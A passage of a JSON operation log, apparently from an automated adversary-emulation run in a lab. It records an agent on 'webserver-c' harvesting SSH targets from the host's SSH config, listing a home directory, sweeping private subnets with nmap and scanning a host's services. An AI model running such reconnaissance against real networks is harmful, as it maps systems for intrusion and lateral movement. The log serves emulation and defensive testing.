"databaseB@192.168.201.6:22", "created": "2024-04-26T23:43:50Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["f4eac7ba-a67f-4f2f-a62a-a45c83115929"], "relationships": ["remote.ssh.cmd(databaseB@192.168.201.6:22)"], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": "T1021.006"}, {"unique": "remote.ssh.cmdemployeeA@192.168.201.3:22", "trait": "remote.ssh.cmd", "name": "remote.ssh.cmd", "value": "employeeA@192.168.201.3:22", "created": "2024-04-26T23:43:50Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["f4eac7ba-a67f-4f2f-a62a-a45c83115929"], "relationships": ["remote.ssh.cmd(employeeA@192.168.201.3:22)"], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": "T1021.006"}, {"unique": "remote.ssh.cmdemployeeB@192.168.201.4:22", "trait": "remote.ssh.cmd", "name": "remote.ssh.cmd", "value": "employeeB@192.168.201.4:22", "created": "2024-04-26T23:43:50Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["f4eac7ba-a67f-4f2f-a62a-a45c83115929"], "relationships": ["remote.ssh.cmd(employeeB@192.168.201.4:22)"], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": "T1021.006"}], "relationships": [], "used": [], "unique": "f4eac7ba-a67f-4f2f-a62a-a45c83115929", "collect": "2024-04-26T23:43:41Z", "finish": "2024-04-26T23:43:50Z", "ability": {"ability_id": "deception-parse-sshconfig", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Parse SSH Config", "description": "Uses stormssh to parse the ssh config file", "executors": [{"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-c", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:43:41Z"}, {"id": "76974f3a-6a64-46a0-a73c-baeff3fc0cf4", "paw": "dagwxr", "command": "ls -l /home/tomcat/", "plaintext_command": "ls -l /home/tomcat/", "status": 0, "score": 1, "decide": "2024-04-26T23:43:51Z", "pin": 0, "pid": "1489", "facts": [{"unique": "host.dir.path/home/tomcat/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/tomcat/", "created": "2024-04-26T23:43:51Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["76974f3a-6a64-46a0-a73c-baeff3fc0cf4"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, {"unique": "host.dir.files['/home/tomcat/splunkd']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/tomcat/splunkd"], "created": "2024-04-26T23:40:57Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["bc961b42-1eed-492c-bc9e-9491fe7ce6d0", "fe2f6f79-c116-48b3-9fd3-20947b3992db", "76974f3a-6a64-46a0-a73c-baeff3fc0cf4", "ad7463f9-d256-4ec9-8995-e54deeab4ac5", "0473c7dc-bdbc-47eb-882b-216d0a0e5402"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["czljvk", "cxfxwj", "dagwxr", "gbimmx", "jyirhn"], "technique_id": "T9012"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf49966e0>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46dfdf0>", "source": {"unique": "host.dir.path/home/tomcat/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/tomcat/", "created": "2024-04-26T23:43:51Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["76974f3a-6a64-46a0-a73c-baeff3fc0cf4"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, "edge": "has_contents", "target": {"unique": "host.dir.files['/home/tomcat/splunkd']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/tomcat/splunkd"], "created": "2024-04-26T23:43:51Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "host.dir.path/home/tomcat/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/tomcat/", "created": "2024-04-26T23:43:51Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["76974f3a-6a64-46a0-a73c-baeff3fc0cf4"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}], "unique": "76974f3a-6a64-46a0-a73c-baeff3fc0cf4", "collect": "2024-04-26T23:43:51Z", "finish": "2024-04-26T23:43:51Z", "ability": {"ability_id": "deception-ls", "tactic": "utility", "technique_name": "Deception Enum Folders", "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "executors": [{"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["utility"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-c", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:43:51Z"}, {"id": "fc9592ce-36cb-47f3-99f7-3396c423f28b", "paw": "dagwxr", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:43:56Z", "pin": 0, "pid": "1491", "facts": [{"unique": "host.subnet.ipaddrs192.168.202.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.202.0/24", "created": "2024-04-26T23:39:22Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["527e0f53-965b-492f-b99c-ef0b203dd210", "7a846efd-64e1-4d5f-acaf-b7f0daf27897", "95c7474e-c9af-4a1b-9305-1b4d6df22d65", "fc9592ce-36cb-47f3-99f7-3396c423f28b", "27eea4c0-3b4f-40a9-a774-6b3e6c289dd0", "47fd5207-03ae-4378-afa1-84f0e7a890d7", "d8bd914e-39d8-44fc-b217-7182f38229b6", "c144d9fb-7334-4baa-9c4c-427c5aa2f2b2"], "relationships": ["host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.1', '192.168.202.2', '192.168.202.3'])", "host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.3'])", "host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.202.3']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.202.3"], "created": "2024-04-26T23:44:03Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["fc9592ce-36cb-47f3-99f7-3396c423f28b"], "relationships": ["host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.3'])"], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4770f70>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4773c70>", "source": {"unique": "host.subnet.ipaddrs192.168.202.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.202.0/24", "created": "2024-04-26T23:44:03Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.202.3']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.202.3"], "created": "2024-04-26T23:44:03Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.202.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.202.0/24", "created": "2024-04-26T23:43:56Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "fc9592ce-36cb-47f3-99f7-3396c423f28b", "collect": "2024-04-26T23:44:00Z", "finish": "2024-04-26T23:44:03Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-c", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:44:00Z"}, {"id": "832fe5d7-e203-4479-a83f-25bc8c762719", "paw": "dagwxr", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:44:06Z", "pin": 0, "pid": "1493", "facts": [{"unique": "host.subnet.ipaddrs192.168.200.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.200.0/24", "created": "2024-04-26T23:39:35Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["7095ef06-22b7-4473-b807-91ba0dea838b", "e9c873ff-de3a-4d7e-a279-7ba20d4f2eb8", "3e0385dd-eadf-4b80-bc55-4aea1b79aa80", "832fe5d7-e203-4479-a83f-25bc8c762719", "56bc1feb-a57e-470e-837b-9173b738d06d", "af654b8a-e076-47fb-8564-6b40300f2c80", "e2eb1c16-cff6-4a6a-9aa0-ddd3abc9ffa6", "1bb1488d-c40c-47f1-888c-97fe1a623b17"], "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.200.2", "192.168.200.3", "192.168.200.4", "192.168.200.5"], "created": "2024-04-26T23:44:11Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["832fe5d7-e203-4479-a83f-25bc8c762719"], "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5'])"], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46ddf00>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46df370>", "source": {"unique": "host.subnet.ipaddrs192.168.200.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.200.0/24", "created": "2024-04-26T23:44:11Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.200.2", "192.168.200.3", "192.168.200.4", "192.168.200.5"], "created": "2024-04-26T23:44:11Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.200.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.200.0/24", "created": "2024-04-26T23:44:06Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "832fe5d7-e203-4479-a83f-25bc8c762719", "collect": "2024-04-26T23:44:08Z", "finish": "2024-04-26T23:44:11Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-c", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:44:08Z"}, {"id": "e9bb737a-d6f7-43ce-a28f-c824629a61a9", "paw": "dagwxr", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:44:11Z", "pin": 0, "pid": "1495", "facts": [{"unique": "host.subnet.ipaddrs192.168.201.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.201.0/24", "created": "2024-04-26T23:40:02Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["8820d7db-0ef2-44ef-8197-501e8ee3c43b", "e07921d6-b9e1-4277-a4d0-c12a3109baa4", "26f46d4f-0c48-4952-99b4-e4a3766799fb", "e9bb737a-d6f7-43ce-a28f-c824629a61a9", "34eeee8c-eb81-48c0-8e26-c4c4a97e4f3f", "27cfc0cb-e7a4-4693-b6d3-fd1cf6d43abb", "9511e310-83f1-4fdd-a60e-24b1d7b4c545", "67271bd6-f418-4a31-8ac9-adfbbf7e97f4"], "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.201.3", "192.168.201.4", "192.168.201.5", "192.168.201.6", "192.168.201.82", "192.168.201.90"], "created": "2024-04-26T23:41:36Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["e07921d6-b9e1-4277-a4d0-c12a3109baa4", "26f46d4f-0c48-4952-99b4-e4a3766799fb", "e9bb737a-d6f7-43ce-a28f-c824629a61a9"], "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])"], "limit_count": -1, "collected_by": ["czljvk", "cxfxwj", "dagwxr"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46dfee0>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46ddff0>", "source": {"unique": "host.subnet.ipaddrs192.168.201.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.201.0/24", "created": "2024-04-26T23:44:22Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.201.3", "192.168.201.4", "192.168.201.5", "192.168.201.6", "192.168.201.82", "192.168.201.90"], "created": "2024-04-26T23:44:22Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.201.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.201.0/24", "created": "2024-04-26T23:44:11Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "e9bb737a-d6f7-43ce-a28f-c824629a61a9", "collect": "2024-04-26T23:44:19Z", "finish": "2024-04-26T23:44:22Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-c", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:44:19Z"}, {"id": "de63325b-25ae-453b-84d1-860a8e4f7eef", "paw": "dagwxr", "command": "nmap -sV --version-light -oX - 192.168.202.3", "plaintext_command": "nmap -sV --version-light -oX - 192.168.202.3", "status": 0, "score": 1, "decide": "2024-04-26T23:44:26Z", "pin": 0, "pid": "1497", "facts": [{"unique": "host.remote.ip192.168.202.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.202.3", "created": "2024-04-26T23:44:29Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["de63325b-25ae-453b-84d1-860a8e4f7eef"], "relationships": ["host.remote.ip(192.168.202.3) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.202.3) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": "T1021.004"}, {"unique": "host.remote.ports['22']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "007336c1-5bd0-4984-8a61-e7ccc05b3401", "de63325b-25ae-453b-84d1-860a8e4f7eef", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.4) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.5) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.6) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.202.3) : has_open_ports : host.remote.ports(['22'])"], "limit_count": -1, "collected_by": ["czljvk", "cxfxwj", "dagwxr", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "007336c1-5bd0-4984-8a61-e7ccc05b3401", "de63325b-25ae-453b-84d1-860a8e4f7eef", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.201.4) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.201.5) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.201.6) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.202.3) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["czljvk", "cxfxwj", "dagwxr", "etrrtg"], "technique_id": "T1021.004"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479e0e0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479fc10>", "source": {"unique": "host.remote.ip192.168.202.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.202.3", "created": "2024-04-26T23:44:29Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:44:29Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479c850>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479fbb0>", "source": {"unique": "host.remote.ip192.168.202.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.202.3", "created": "2024-04-26T23:44:29Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:44:29Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.remote.addr192.168.202.3", "trait": "scan.remote.addr", "name": "scan.remote.addr", "value": "192.168.202.3", "created": "2024-04-26T23:44:26Z", "score": 3, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "de63325b-25ae-453b-84d1-860a8e4f7eef", "collect": "2024-04-26T23:44:28Z", "finish": "2024-04-26T23:44:29Z", "ability": {"ability_id": "deception-nmap", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "executors": [{"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", 